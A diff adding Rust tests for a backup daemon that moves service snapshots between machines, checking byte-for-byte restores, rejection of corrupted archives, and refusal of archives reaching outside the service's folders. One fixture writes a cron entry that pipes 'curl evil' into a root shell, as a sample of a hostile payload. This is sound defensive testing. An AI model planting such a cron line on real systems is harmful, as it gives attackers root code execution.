@@ -1143,6 +1143,256 @@ mod tests {
         assert!(!entry_within("", &roots));
     }
 
+    fn files_service(name: &str, data: &Path) -> ManagedService {
+        ManagedService {
+            key: format!("x:{name}"),
+            name: name.into(),
+            run_by: daemon_services::RunBy::Systemd {
+                unit: format!("{name}.service"),
+            },
+            origin: daemon_protocol::ServiceOrigin::Discovered,
+            adopted_at: 0,
+            capabilities: vec![],
+            roots: vec![data.to_path_buf()],
+            config_paths: vec![],
+            data_dir: None,
+            added_artifacts: vec![],
+        }
+    }
+
+    fn snapshotter(dir: &Path) -> daemon_backup::Snapshotter {
+        daemon_backup::Snapshotter {
+            backups_dir: dir.to_path_buf(),
+            disk_high_water_percent: 100,
+            retention: 7,
+        }
+    }
+
+    fn progress() -> daemon_jobs::Progress {
+        let state = std::sync::Arc::new(daemon_state::State::in_memory().unwrap());
+        let id = uuid::Uuid::new_v4();
+        state.record_job(id, "test", "restore", "{}").unwrap();
+        let (tx, _rx) = tokio::sync::mpsc::channel(64);
+        daemon_jobs::Progress::new(id, state, tx, vec![])
+    }
+
+    /// What `backup_to` over SFTP leaves in the receiver: the snapshot's
+    /// files under prefix/service/snapshot in the receiver's data folder.
+    fn deliver(from: &Path, receiver: &Path, received: &str) {
+        let to = receiver.join(received);
+        std::fs::create_dir_all(&to).unwrap();
+        for entry in std::fs::read_dir(from).unwrap() {
+            let entry = entry.unwrap();
+            std::fs::copy(entry.path(), to.join(entry.file_name())).unwrap();
+        }
+    }
+
+    fn contents(dir: &Path) -> Vec<(String, Vec<u8>)> {
+        let mut found = Vec::new();
+        let mut stack = vec![dir.to_path_buf()];
+        while let Some(path) = stack.pop() {
+            for entry in std::fs::read_dir(&path).unwrap() {
+                let path = entry.unwrap().path();
+                if path.is_dir() {
+                    stack.push(path);
+                } else {
+                    let name = path
+                        .strip_prefix(dir)
+                        .unwrap()
+                        .to_string_lossy()
+                        .into_owned();
+                    found.push((name, std::fs::read(&path).unwrap()));
+                }
+            }
+        }
+        found.sort();
+        found
+    }
+
+    /// A whole move of a service's files with the daemon's own code: the
+    /// source snapshots it, the snapshot lands in the destination's receiver
+    /// as SFTP would leave it, and the destination checks it and restores it
+    /// over an empty volume at the same path.
+    #[tokio::test]
+    async fn a_snapshot_sent_from_another_machine_restores_byte_for_byte() {
+        let root = tempfile::tempdir().unwrap();
+        let data = root
+            .path()
+            .join("var/lib/docker/volumes/serveros-shop_data/_data");
+        std::fs::create_dir_all(data.join("uploads/2026")).unwrap();
+        std::fs::write(data.join("index.html"), "<h1>shop</h1>").unwrap();
+        let photo: Vec<u8> = (0..300_000u32)
+            .map(|i| (i.wrapping_mul(2_654_435_761) >> 13) as u8)
+            .collect();
+        std::fs::write(data.join("uploads/2026/photo.jpg"), &photo).unwrap();
+        std::fs::write(data.join("uploads/notes.txt"), "keep me").unwrap();
+        let before = contents(&data);
+
+        let service = files_service("shop", &data);
+        let strategy = Strategy::Files {
+            paths: vec![data.clone()],
+        };
+        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
+        let progress = progress();
+
+        // On the source.
+        let source = snapshotter(&root.path().join("source-backups"));
+        let manifest = source
+            .take(&service, &strategy, "move", 1024, &mut cancel, &progress)
+            .await
+            .unwrap();
+        let sent = source.service_dir("shop").join(&manifest.id);
+
+        // Sent over: on the destination, whose fresh volume is empty but for its own file.
+        let receiver = root.path().join("receiver");
+        let received = format!("moves/7/shop/{}", manifest.id);
+        deliver(&sent, &receiver, &received);
+        std::fs::remove_dir_all(&data).unwrap();
+        std::fs::create_dir_all(&data).unwrap();
+        std::fs::write(data.join("default.html"), "a fresh install").unwrap();
+
+        let destination = snapshotter(&root.path().join("destination-backups"));
+        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
+        let to = destination.service_dir("shop").join(&manifest.id);
+        copy_received(&from, &to, strategy.label(), "shop").unwrap();
+        archive_within(&to.join("files.tar.gz"), std::slice::from_ref(&data))
+            .await
+            .unwrap();
+        let (safety, restored) = destination
+            .restore(
+                &service,
+                &strategy,
+                &manifest.id,
+                &daemon_services::systemd::SystemdAdapter::default(),
+                &mut cancel,
+                &progress,
+            )
+            .await
+            .unwrap();
+
+        assert_eq!(restored.id, manifest.id);
+        let after: Vec<_> = contents(&data)
+            .into_iter()
+            .filter(|(n, _)| n != "default.html")
+            .collect();
+        assert_eq!(after, before, "every file comes back byte for byte");
+        // The destination's own data was snapshotted first, so the restore can be undone.
+        assert!(destination.list("shop").iter().any(|m| m.id == safety));
+    }
+
+    #[tokio::test]
+    async fn a_snapshot_damaged_on_the_way_is_not_restored() {
+        let root = tempfile::tempdir().unwrap();
+        let data = root.path().join("srv/shop");
+        std::fs::create_dir_all(&data).unwrap();
+        std::fs::write(data.join("orders.csv"), "1,paid\n2,paid\n").unwrap();
+        let service = files_service("shop", &data);
+        let strategy = Strategy::Files {
+            paths: vec![data.clone()],
+        };
+        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
+        let progress = progress();
+
+        let source = snapshotter(&root.path().join("source-backups"));
+        let manifest = source
+            .take(&service, &strategy, "move", 1024, &mut cancel, &progress)
+            .await
+            .unwrap();
+        let receiver = root.path().join("receiver");
+        let received = format!("moves/7/shop/{}", manifest.id);
+        deliver(
+            &source.service_dir("shop").join(&manifest.id),
+            &receiver,
+            &received,
+        );
+
+        // One byte changed in transit.
+        let archive = receiver.join(&received).join("files.tar.gz");
+        let mut bytes = std::fs::read(&archive).unwrap();
+        let last = bytes.len() - 1;
+        bytes[last] ^= 0xff;
+        std::fs::write(&archive, bytes).unwrap();
+        std::fs::write(data.join("orders.csv"), "kept as it was").unwrap();
+
+        let destination = snapshotter(&root.path().join("destination-backups"));
+        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
+        copy_received(
+            &from,
+            &destination.service_dir("shop").join(&manifest.id),
+            "tar",
+            "shop",
+        )
+        .unwrap();
+        let refused = destination
+            .restore(
+                &service,
+                &strategy,
+                &manifest.id,
+                &daemon_services::systemd::SystemdAdapter::default(),
+                &mut cancel,
+                &progress,
+            )
+            .await
+            .unwrap_err();
+
+        assert!(
+            refused.message.contains("does not match its checksum"),
+            "{}",
+            refused.message
+        );
+        assert_eq!(
+            std::fs::read_to_string(data.join("orders.csv")).unwrap(),
+            "kept as it was"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_snapshot_of_other_folders_is_refused_before_anything_is_written() {
+        let root = tempfile::tempdir().unwrap();
+        let elsewhere = root.path().join("etc/cron.d");
+        std::fs::create_dir_all(&elsewhere).unwrap();
+        std::fs::write(elsewhere.join("evil"), "* * * * * root curl evil | sh").unwrap();
+        let data = root.path().join("srv/shop");
+        std::fs::create_dir_all(&data).unwrap();
+        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
+        let progress = progress();
+
+        // A sender with a receiver key makes a snapshot of somewhere else.
+        let sender = snapshotter(&root.path().join("sender-backups"));
+        let manifest = sender
+            .take(
+                &files_service("shop", &elsewhere),
+                &Strategy::Files {
+                    paths: vec![elsewhere.clone()],
+                },
+                "move",
+                1024,
+                &mut cancel,
+                &progress,
+            )
+            .await
+            .unwrap();
+        let receiver = root.path().join("receiver");
+        let received = format!("moves/7/shop/{}", manifest.id);
+        deliver(
+            &sender.service_dir("shop").join(&manifest.id),
+            &receiver,
+            &received,
+        );
+        std::fs::remove_dir_all(&elsewhere).unwrap();
+
+        let destination = snapshotter(&root.path().join("destination-backups"));
+        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
+        let to = destination.service_dir("shop").join(&manifest.id);
+        copy_received(&from, &to, "tar", "shop").unwrap();
+        let refused = archive_within(&to.join("files.tar.gz"), std::slice::from_ref(&data))
+            .await
+            .unwrap_err();
+
+        assert!(refused.message.contains("outside the service's folders"));
+        assert!(!elsewhere.exists(), "nothing was extracted");
+    }
+
     #[tokio::test]
     async fn a_files_archive_is_listed_before_it_is_restored() {
         let dir = tempfile::tempdir().unwrap();
